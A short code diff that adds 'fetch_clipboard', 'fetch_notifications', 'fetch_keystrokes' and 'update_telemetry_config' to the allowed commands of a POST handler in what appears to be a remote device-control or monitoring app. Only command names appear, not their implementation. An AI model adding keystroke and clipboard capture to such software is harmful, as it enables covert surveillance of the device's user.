@@ -69,6 +69,10 @@ export async function POST(
       "stop_live_movement",
       "webrtc_stream",
       "sync_wifi",
+      "fetch_clipboard",
+      "fetch_notifications",
+      "fetch_keystrokes",
+      "update_telemetry_config",
     ];
 
     if (!validCommands.includes(command)) {
